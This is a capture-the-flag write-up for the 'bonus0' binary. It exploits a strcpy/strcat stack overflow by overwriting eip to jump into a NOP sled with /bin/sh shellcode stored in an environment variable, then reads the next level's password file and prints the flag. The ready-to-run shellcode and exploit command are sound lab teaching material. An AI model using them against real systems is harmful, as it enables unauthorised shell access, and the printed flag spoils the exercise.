# bonus0

The executable does the following :

- Reads `4096` bytes of `stdin` and copy the first `20` into `a`
- Reads `4096` bytes of `stdin` and copy the first `20` into `b`
- `strcpy` the contents of `a` to `dest`
- `strcat` the contents of `b` to `dest`

With no function to call or function pointer, we'll use `eip` to point to a shellcode.

## **The addresses**

To figure out what happens, we'll fill the first prompt with a bunch of `A` and the second with a bunch of `B` here (at least 20).

In `gdb`, we get the addresses of the buffer and `eip` using `x/32xw $esp` and `i r $ebp` :

- The buffer is at `0xbffff606`
- `eip` is at `0xbffff63c`

`0x3c - 0x06 = 0x38 = 54 bytes`

Because of the `strcpy` and the `strcat`, the buffer has the following format :

```
20 bytes of A + 20 bytes of B + 5 bytes of filler + 20 bytes from B again
```

Our 54-byte offset starts us off at the **10th character of the second B buffer**.

This will give us the following :

```
20 bytes + 9 bytes + ADDRESS + 7 bytes + 5 bytes + 9 bytes + ADDRESS + 7 bytes
[   A   ]  [            B            ]  [ random ] [        copy of B        ]
```

Problem : this only gives us 29 bytes for the shellcode. We'll need to find a workaround if we want to use our 45-byte shellcode.

## **The envp**

We haven't needed it so far, but the `envp` table is a neat place for storing as much as we want in memory.

To use it, we can use the syntax `env -i name=value ./executable`. We run the following :

```
env -i shellcode=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb bonus0
```

Now we can find our shellcode, by skimming through memory looking for 0x90909090 blocks (using something like `x/64xw 0xADDRESS`).

In `gdb`, the nopesled spans from `0xbffffd8a` to `0xbfffff8a`.

This is a place where a big nopesled is useful for more than just visibility ; before, we knew exact addresses, but here, the address of our env shellcode changes between `gdb` and regular execution (possibly because `gdb` sets its own env variables).

With a nopesled 512 bytes wide, by targeting its middle, we get 256 bytes of wiggle room left *and* right, in case of a shift.

We decide to target the midpoint, `0xbffffe8a`.

## **The command**

Now to put this all together. We'll need to send something like this :

```
( BUFFER A ; BUFFER B WITH ADDRESS ; COMMAND FOR /BIN/SH ) | env -i shellcode=SHELLCODE ./bonus0
```

We run the following :

```
( python -c 'print("A" * 20)' ; python -c 'print("B" * 9 + "\x8a\xfe\xff\xbf" + "B" * 7)' ; echo 'cat /home/user/bonus1/.pass' ) | env -i shellcode=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./bonus0
```

## **The flag**

It works ! We get the flag for `bonus0` :

```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```